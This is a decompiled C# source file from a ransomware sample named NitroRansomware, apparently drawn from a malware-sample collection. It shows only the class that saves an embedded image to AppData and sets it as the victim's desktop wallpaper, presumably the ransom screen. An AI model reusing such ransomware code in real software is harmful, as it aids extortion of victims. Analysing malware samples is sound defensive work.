// Decompiled with JetBrains decompiler
// Type: NitroRansomware.Wallpaper
// Assembly: NitroRansomware, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 884F7023-5B8E-423B-BD61-5C84B42B2DFE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\HEUR-Trojan-Ransom.MSIL.Gen.gen-92190c9789485a0d96bced7040080f0ae35c02898c3d31a65d50ecd659b80f09.exe

using NitroRansomware.Properties;
using System;
using System.Runtime.InteropServices;

namespace NitroRansomware
{
  internal class Wallpaper
  {
    private static uint SPI_SETWALL = 20;
    private static uint SPIF_UPDATE = 1;
    private static uint SPIF_SWEDWINI = 2;
    private static string fileName;

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(
      uint uAction,
      int uParam,
      string lpvParam,
      uint fuWinIni);

    public static void ChangeWallpaper()
    {
      Wallpaper.fileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\wallpaper.png";
      Resources.wl.Save(Wallpaper.fileName);
      Wallpaper.SystemParametersInfo(Wallpaper.SPI_SETWALL, 0, Wallpaper.fileName, Wallpaper.SPIF_UPDATE | Wallpaper.SPIF_SWEDWINI);
    }
  }
}
